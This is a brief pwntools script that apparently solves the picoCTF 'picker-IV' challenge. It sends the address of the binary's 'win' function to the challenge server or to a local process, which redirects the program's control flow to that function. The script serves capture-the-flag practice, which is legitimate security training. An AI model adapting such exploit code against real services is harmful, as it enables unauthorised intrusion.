#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  53419
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./picker-IV', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendlineafter(b" '0x': ", hex(exe.sym.win))

p.interactive()